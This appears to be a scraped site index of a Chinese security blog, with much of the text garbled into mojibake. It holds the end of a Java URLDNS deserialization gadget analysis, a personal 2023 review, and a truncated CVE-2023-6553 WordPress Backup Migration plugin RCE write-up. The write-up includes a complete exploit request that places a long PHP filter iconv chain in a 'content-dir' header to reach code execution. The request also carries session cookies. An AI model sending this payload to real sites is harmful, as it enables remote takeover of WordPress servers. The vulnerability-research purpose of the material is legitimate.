handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } å‚è€ƒé“¾æ¥\nhttps://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\nhttps://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90\nCreated at 2024-01-08T16:57:37+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/","title":"å®‰å…¨ç ”ç©¶","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"ååºåˆ—åŒ–","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/2023-review-and-2024-outlook/","title":"2023 Review and 2024 Outlook","tags":[],"description":"","content":"å‰è¨€ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ—¶é—´åœ¨è®¡ç®—æœºå†…çš„è¡¨ç°å½¢å¼åªæ˜¯ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œç°å®ä¸–ç•Œä»2023-12-31 23:59åˆ°2024-01-01 00:00ä¹Ÿåªæ˜¯åœ¨æ—¶é—´æˆ³ä¸Šå¢åŠ äº†60000ä¸ªæ¯«ç§’ã€‚ ä»ç”Ÿç†è§’åº¦è®²ï¼Œè·¨å¹´èº«ä½“ä¸Šä¹Ÿå¹¶ä¸ä¼šå‡ºç°å¤ªå¤§çš„å˜åŒ–ï¼Œæ‰€ä»¥å³ä½¿æ–°å¹´å®šä¸‹äº†ç›®æ ‡ï¼Œæ›´æœ‰å¯èƒ½çš„æ˜¯2023å¹´æ˜¯æ€ä¹ˆæ ·2024å¹´è¿˜æ˜¯æ€ä¹ˆæ ·ã€‚\nè¿™ä¸ªæ–‡ç« æ¯”æˆ‘æƒ³è±¡ä¸­æ›´éš¾å†™ï¼Œå†™äº†åˆåˆ åˆ äº†åˆå†™ï¼Œåˆ°å‘å¸ƒçš„æ—¶å€™è·ç¦»2023.12.31å·²ç»è¿‡å»äº†äº”å¤©ã€‚\nä½†æˆ‘è®¤ä¸ºåšä¸ªä¸€ä¸ªé˜¶æ®µæ€§çš„æ€»ç»“å¯ä»¥åœ¨æœªæ¥å›é¡¾è¿‡å»çš„æ—¶å€™æœ‰ä¸€ä¸ªå‚è€ƒåæ ‡ã€‚å°±åƒåˆä¸­é‚£ä¼šæµè¡Œçš„éä¸»æµ/å¤§å¤´è´´ä»¥åŠé‚£äº›å‘åœ¨QQç©ºé—´çš„é¢œæ–‡å­—å’Œç«æ˜Ÿæ–‡ï¼Œç°åœ¨çœ‹æ¥ä¹Ÿéå¸¸æœ‰æ„æ€ï¼Œç®—æ˜¯æ›¾ç»åº¦è¿‡ä¸€æ®µéä¸»æµå²æœˆçš„ä½è¯ã€‚ æ‰€ä»¥å†³å®šå†™ä¸‹è¿™ä¸ª2023å¹´çš„å¿«ç…§ï¼Œç­‰åˆ°2024.12.31çš„æ—¶å€™å†å›å¤´çœ‹çœ‹2024å¹´éƒ½åšäº†ä»€ä¹ˆã€‚å½“ç„¶åšä¸€ä¸ªæ•´ä½“å›é¡¾çš„è¯ä¹Ÿä¸èƒ½é¿å¼€é‚£äº›åšçš„ä¸å¥½çš„åœ°æ–¹ï¼Œè™½ç„¶å†™ä¸‹æ¥æ„Ÿè§‰ä¸å¤ªå¥½æ„æ€ï¼Œä½†è¿˜æ˜¯å†³å®šè¯•ä¸€è¯•ã€‚â€‹\nè‡³äºæ–°å¹´ç›®æ ‡ï¼Œæˆ‘è§‰å¾—å¯ä»¥åˆ†ä¸ºç¡¬æ€§å’Œè½¯æ€§ç›®æ ‡ï¼Œç¡¬æ€§ç›®æ ‡è®¢ä¸€äº›èƒ½å¤Ÿé‡åŒ–çš„ã€ä¼˜å…ˆçº§é«˜çš„ï¼Œè½¯æ€§ç›®æ ‡è®¢ä¸€äº›éš¾ä»¥å®šé‡çš„ã€ä¼˜å…ˆçº§ä½çš„ã€‚å¹´åº¦ç›®æ ‡å®šè°ƒå¤ªé«˜å®¹æ˜“å®Œä¸æˆï¼Œåè€Œå®¹æ˜“äº§ç”Ÿæ—¢ç„¶å®Œä¸æˆé‚£å°±ç›´æ¥æ”¾å¼ƒçš„å¿ƒæ€ã€‚ åœ¨å®Œæˆæ—¢å®šç›®æ ‡çš„æ—¶å€™å¤§è„‘ä¼šåˆ†æ³Œå¤šå·´èƒºï¼Œè¿™æ˜¯äººæ„Ÿè§‰åˆ°å¿«ä¹çš„æ¥æºä¹‹ä¸€ï¼Œè·Ÿä¹‹å‰æˆåŠŸåˆ†ææ¼æ´ã€å†™å‡ºPoCçš„æ—¶å€™æ•´ä¸ªäººä¼šæ„Ÿåˆ°å…´å¥‹å’Œå¿«ä¹ä¸€æ ·ï¼Œè¿™å¯ä»¥ç»™è‡ªå·±ä¸€ä¸ªæ­£å¾ªç¯çš„åé¦ˆã€‚\n2023æ€»ç»“ äººå›å¤´å®¡è§†è‡ªå·±åšäº†ä»€ä¹ˆæ€»æ˜¯è‰°éš¾çš„ï¼Œè·Ÿç…§é•œå­ä¸€æ ·ï¼Œç…§é•œå­çš„æ—¶å€™äººè„‘ä¼šä¸è‡ªè§‰çš„ä¿®æ­£è„¸éƒ¨ç¼ºé™·ï¼Œåšå¹´åº¦å›é¡¾çš„æ—¶å€™å¯èƒ½ä¼šä¸‹æ„è¯†çš„å¿½ç•¥åè€…ç¾åŒ–è¿™ä¸€å¹´åšçš„ä¸è¶³çš„éƒ¨åˆ†ï¼Œä»¥ä¸‹å¯èƒ½æ˜¯éƒ¨åˆ†èƒ½å°½åŠ›æƒ³èµ·æ¥çš„æ€»ç»“ã€‚ 2022å¹´æœ«çš„æ—¶å€™å…¶å®å¹¶æœªæ­£å¼åˆ¶å®š2023å¹´è®¡åˆ’ï¼Œä»¥ä¸‹æ˜¯å·²ç»è¿‡å»çš„2023å®Œæˆçš„ä¸€äº›äº‹é¡¹:\nå¤§æ¦‚èŠ±äº†ä¸€ä¸ªæœˆçš„æ™šä¸ŠæŠŠå´æ€ä¸‰éƒ¨æ›²ä¹‹äºŒçš„ã€Šæ½œè§„åˆ™ã€‹çœ‹å®Œäº†ï¼Œé‡æ–°è¯»äº†ä¸€éã€Šè¡€é…¬å®šå¾‹ã€‹ã€‚ å…¬ä¼—å·å‘è¡¨äº†åäºŒç¯‡æŠ€æœ¯æ€§çš„æ–‡ç« ï¼Œå…¶ä¸­åä¸€ç¯‡æ¼æ´åˆ†æï¼Œä¸€ç¯‡ç ”ç©¶æ–‡ç« ï¼Œå…¬ä¼—å·æ¶¨åˆ°ç²‰ä¸214ã€‚ ç»è¿‡å¤§çº¦ä¸ƒä¸ªæœˆçš„æ‰“å¡ï¼Œå•è¯è¯æ±‡é‡ä¸€åƒå·¦å³ã€‚ æŠŠåšå®¢è¿è¥èµ·æ¥äº†ï¼Œç°åœ¨å·²æœ‰äºŒä¸‰åç¯‡æ–‡ç« ã€‚ åšäº†ä¸€ä¸‹æœ‰ä»·å€¼çš„å·¥ä½œï¼Œè¾“å‡ºäº†æœ‰ä»·å€¼çš„å†…å®¹ã€‚ å½“ç„¶é™¤äº†ä¸Šé¢é‚£äº›ï¼Œè¿˜æœ‰æœªå®Œæˆçš„éƒ¨åˆ†ï¼š\nå¹´ä¸­çš„æ—¶å€™æƒ³ç€å»ç»ƒç‚¹è‚Œè‚‰ï¼Œç»“æœæ¯æ¬¡è¿˜æ˜¯æ‡’å¾—å»ï¼Œç»“æœåˆ°å¹´æœ«è¿˜æ˜¯æ²¡ç»ƒèµ·æ¥ï¼Œè™½ç„¶æ•´ä¸ªäººåç˜¦ï¼Œä½†è‚šå­ä¸Šè¿˜æ˜¯æœ‰èµ˜è‚‰ï¼Œè¿æ¯æ—¥è·‘æ­¥ä¹Ÿå¾ˆä¹…æ²¡å»äº†ã€‚ å•è¯éƒ¨åˆ†ï¼Œæœ‰çš„æ—¶å€™ä¼šå·æ‡’ï¼Œæ‰“ä¸ªå¡å°±å®Œäº‹äº†ï¼Œå¯¼è‡´åˆ°ç°åœ¨æ‰“å¡äº†200å¤©ï¼Œå•è¯é‡åªæœ‰ä¸€åƒå·¦å³ã€‚ ä¸€äº›æ–‡ç« é“¾æ¥ä¸€ç›´èººåœ¨æµè§ˆå™¨ã€feedè½¯ä»¶é‡Œé¢ï¼Œä¸€ç›´æ²¡çœ‹ã€‚ ç„¶åæŠ€æœ¯éƒ¨åˆ†ï¼Œå¦‚ä¸‹å›¾ï¼Œå¤§æ¦‚è¿˜æœ‰9ç¯‡é—ç•™æ¼æ´åˆ†æçš„æ²¡æœ‰æ•´ç†åˆ°åšå®¢ï¼Œå…¶å®ä¹‹å‰éƒ½çœ‹å®Œäº†æ¥ç€ï¼Œä¸€ç›´æƒ³æ•´ç†ä½†ä¸€ç›´å·æ‡’ï¼Œç„¶åå¯èƒ½å¾—é‡æ–°çœ‹äº†ã€‚ å¯¹äº2023å¤§æ¦‚èƒ½å›å¿†åˆ°è¿™äº›ï¼Œ2023åšçš„å¥½å’Œä¸å¥½éƒ½å·²ç»è¿‡å»äº†ï¼Œæ²‰è¿·äºè¿‡å»æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚å¯¹æˆ‘æ¥è¯´2023å¹´å˜åŒ–è¾ƒå¤§çš„ä¸€å¹´ï¼Œå…”å¹´æ˜¯æˆ‘ç¬¬äºŒä¸ªæœ¬å‘½å¹´ï¼Œç¬¬ä¸€æ¬¡æ„è¯†åˆ°ç¦»30å²æ˜¯å¦‚æ­¤æ¥è¿‘ï¼Œåœ¨æˆ‘çš„æ„Ÿè§‰ä¸­å¥½åƒè·ç¦»å¤§å­¦æ¯•ä¸šä¹Ÿæ²¡å¤šä¹…ï¼Œå›å¤´ä¸€çœ‹ä¹Ÿå¿«ä¸‰å¹´äº†ã€‚ä½œä¸ºä¸€ä¸ªè¡€ç»Ÿçº¯æ­£çš„å—æ–¹äººï¼Œå…¶å®åœ¨åŒ—æ–¹è¿‡çš„å¹¶ä¸ç®—ä¹ æƒ¯ï¼Œä»¥å‰æˆ‘åœ¨å—æ–¹ç”Ÿæ´»çš„æ—¶å€™ï¼Œæ˜¥å¤©å¤©ä¸‹é›¨ï¼Œä½†åŒ—äº¬æ˜¥å¤©çš„æ—¶å€™ä¸ä¸‹é›¨ä»¥è‡³äºæœ‰ç‚¹ä¸ä¹ æƒ¯ã€‚é¥®é£Ÿæ–¹é¢ï¼Œä½œä¸ºæ±Ÿè¥¿äººåªèƒ½å¶å°”åƒä¸€åƒæ¹˜èœèŠä»¥æ…°ç±äº†ï¼Œè™½ç„¶èµ£èœå¾ˆå¥½åƒï¼Œä½†ä¸å¾—ä¸æ‰¿è®¤åœ¨å¤–é¢è¿˜æ˜¯æ¹˜èœåšçš„æœ€åˆå£å‘³ï¼Œä½†æœ€ç—›è‹¦çš„æ˜¯æˆ‘æ˜¯æ˜“å¾—å£è…”æºƒç–¡çš„ä½“è´¨ï¼Œæœ‰ä¸€æ¬¡è¿åƒä¸¤é¡¿æ¹˜èœè¿‡äº†ä¸¤å¤©å°±é•¿äº†å‡ ä¸ªå£è…”æºƒç–¡ï¼ŒæŠ˜ç£¨äº†ä¸¤ä¸ªç¤¼æ‹œæ‰å¥½ã€‚\nåŒ—äº¬ç›¸æ¯”äºå—æ–¹æœ€å¥½çš„åœ°æ–¹å°±æ˜¯ï¼Œå†¬å¤©æœ‰æš–æ°”ï¼Œå‘†åœ¨å±‹é‡Œä¸€ç‚¹éƒ½ä¸å†·ï¼Œæ¯å¹´å›å®¶è¿‡å¹´çš„æ—¶å€™ï¼Œä¸‹é›¨åŠ ä¸Š0åº¦çš„å¤©æ°”ï¼Œè®©äººèº²åœ¨è¢«çªé‡Œè¿˜æ˜¯æµ‘èº«å†°å†·ã€‚\n2024å±•æœ› å¤§æ¦‚è¿˜æœ‰ä¸åˆ°ä¸€ä¸ªæœˆå°±è¦ç¦»å¼€å‘†äº†ä¸‰å¹´çš„åŒ—äº¬ï¼Œå»æ­å·åšä¸€äº›å’Œç°åœ¨ä¸ä¸€æ ·çš„ ã€æ›´æœ‰æŒ‘æˆ˜æ€§çš„å·¥ä½œï¼ŒæŒºæœŸå¾…æ–°ä¸€å¹´çš„å·¥ä½œã€‚å±•æœ›ä¸€ä¸‹2024å¹´ï¼Œä¸‹é¢æ˜¯ä¸€äº›åˆæ­¥æ‹Ÿå®šçš„ç›®æ ‡ï¼š\nç¡¬æ€§ç›®æ ‡\nåˆ°2024å¹´æœ«è¯æ±‡é‡èƒ½åˆ°è¾¾2500ï¼Œäº‰å–æ¯å¤©èƒŒ20ä¸ªï¼Œå¤ä¹ 20ä¸ªå•è¯ã€‚ å¤šå†™ä¸€äº›å®‰å…¨ç ”ç©¶çš„æ–‡ç« ï¼Œç°æœ‰çš„æ–‡ç« å¤§éƒ¨åˆ†æ˜¯æ¼æ´åˆ†æï¼Œå¸Œæœ›2024å¹´å¯ä»¥è¾¾åˆ°ä¸€æ¯”ä¸€å§ï¼Œå¦å¤–2024å¹´å¸Œæœ›å¯ä»¥å†™20-30ç¯‡æ–‡ç« ã€‚ åˆ°2024å¹´æœ«å¢é‡åˆ°130æ–¤ã€‚ æŠŠä¹‹å‰æ¬ ä¸‹çš„å€ºå®Œç»“äº†ï¼ŒæŠŠæµè§ˆå™¨å­˜çš„tabå’ŒInstapaperé‡Œé¢å­˜çš„æ–‡ç« çœ‹å®Œã€‚ å­¦ä¹ fuzzã€‚ çœ‹20ä¸ªç”µå½±å’Œ5æœ¬ä¹¦ï¼Œå¤šä¸°å¯Œä¸°å¯Œå¤§è„‘ã€‚ è½¯æ€§ç›®æ ‡\nç²¾è¿›ä½¿ç”¨AIçš„èƒ½åŠ›ï¼Œä¹‹å‰ç”¨AIçš„æ–¹æ³•è¿˜æ˜¯å¤ªç²—ç³™äº†ï¼Œæ„Ÿè§‰æ•ˆæœæ²¡é‚£ä¹ˆå¥½ã€‚ ç†Ÿç»ƒæŒæ¡CodeQLè¿›è¡Œä»£ç å®¡è®¡ã€‚ å¸Œæœ›å…¬ä¼—å·ç²‰ä¸èƒ½ç ´äº”ç™¾ä¸ªï¼Œæˆ‘å†™æ–‡ç« ä¸ä¼šåœ¨å…¶ä»–ç¾¤å’Œæœ‹å‹åœˆå¼•æµï¼Œéƒ½æ˜¯éšç¼˜è®©ç³»ç»Ÿæ¨èï¼Œè™½ç„¶ç°åœ¨å·²ç»æœ‰äº†ä¸¤ç™¾å¤šäº†ï¼Œå¸Œæœ›åˆ°å¹´åº•èƒ½ç¿»å€ã€‚ ä¸‹é™çœ‹çŸ­è§†é¢‘æ—¶é•¿å’Œå’Œæ‰‹æœºä½¿ç”¨æ—¶é•¿ï¼Œå¤šçœ‹çœ‹æ–‡ç« å’Œä¹¦ã€‚ å¸Œæœ›æ–°çš„ä¸€å¹´èƒ½æœ‰æ›´å¤šæˆé•¿å§ï¼Œæ—¶é—´è¶Šèµ°è¶Šå¿«ï¼Œè·ç¦»30å²åªå‰©5å¹´ï¼Œå¸Œæœ›å¯ä»¥æˆä¸ºtop researcher.\né¢˜å¤–è¯ å†™åˆ°åé¢å‘ç°ç¡®å®ä¸å¤ªæ“…é•¿å†™è¿™ç±»æ–‡ç« ï¼Œè„‘å­é‡Œå¾ˆå¤šæƒ³å†™çš„ï¼Œä½†åˆ°é”®ç›˜ä¸Šå°±æ˜¯æ‰“ä¸å‡ºæ¥ï¼Œå®Œå…¨æ²¡æœ‰å†™åˆ†ææ–‡ç« çš„é‚£ç§æ„Ÿè§‰ï¼Œå¯èƒ½æ˜¯ä¹¦è¯»å°‘äº†ï¼Œæ¯å¤©åªçœ‹ä¸€äº›é›¶é›¶æ•£æ•£çš„å†…å®¹ï¼Œè„‘å­é‡Œé¢æ²¡è´§ï¼Œæ–‡ç¬”ç”Ÿç¡¬ï¼Œå¸Œæœ›å°†æ¥å¯ä»¥æ”¹å–„ã€‚\næœ‰ä¸€ä¸ªé»‘å®¢å¿ƒï¼Œä¹Ÿå¸Œæœ›å¯ä»¥ä¸€ç›´ä¿æŒä¸€ä¸ªå¥½å¥‡å¿ƒï¼Œå¤šåšä¸€äº›æœ‰æŒ‘æˆ˜çš„ï¼Œåˆ«äººåšä¸åˆ°çš„äº‹æƒ…ã€‚\n2024å¹´1æœˆ5æ—¥ã€‚\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/","title":"CVE 2023 6553 Wordpress Backup Migration Plugin RCE","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ WordPress çš„å¤‡ä»½è¿ç§»æ’ä»¶çš„/includes/backup-heart.php æ–‡ä»¶ã€‚è¿™æ˜¯ç”±äºæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ä¼ é€’ç»™åŒ…å«çš„å€¼ï¼Œå¹¶éšååˆ©ç”¨è¯¥å€¼å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚\nå½±å“ç‰ˆæœ¬ Backup Migration \u0026lt;= 1.3.7 ç¯å¢ƒæ­å»º å‚è€ƒ\rhttps://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/ä½¿ç”¨dockerå¯åŠ¨\nä¸‹è½½æ’ä»¶å¹¶å¯ç”¨ https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• æŸ¥çœ‹\rè¡¥ä¸å¯çŸ¥é€šè¿‡æ§åˆ¶HTTPå¤´ï¼Œå¯ä»¥æ§åˆ¶åé¢require_onceçš„å‚æ•°ï¼Œå³æ”»å‡»è€…å¯ä»¥é€šè¿‡æ§åˆ¶HTTPå¤´æ§åˆ¶require_onceçš„å‚æ•°ã€‚\nå‚è€ƒ\rPHP filter ä»£ç æ‰§è¡Œ\npocåœ°å€https://github.com/synacktiv/php_filter_chain_generator\nPOST /wp-content/plugins/backup-backup/includes/backup-heart.php HTTP/1.1 Host: 192.168.59.211 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.59.211/wp-admin/ Connection: close Cookie: wordpress_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Ca6e8acc150f152d2b5aa4d373e5ff828187efd0c9e212eab25859d55778a52e2; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node019bmeisxrr5jql3o20jv87og13.node0; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Cb3a0f6ea3e6536b5e606de98a800e4156008295e564a757f1b36ed6a8077c9f7; wp-settings-time-1=1702463992 Upgrade-Insecure-Requests: 1 content-dir: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp Content-Length: 3 å°ç»“ è™½ç„¶åªèƒ½æ§åˆ¶requireåé¢çš„è·¯å¾„å‚æ•°ï¼Œç”±äºPHPçš„åŠ¨æ€æ€§ä»¥åŠPHP filterçš„çµæ´»æ€§ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡PHP filteræ„é€ ç‰¹æ®Šçš„iconv ç¼–ç é“¾è®©requireè·å–åˆ°æ„é€ çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚\nå…¶åˆ©ç”¨å„ç§ç¼–ç 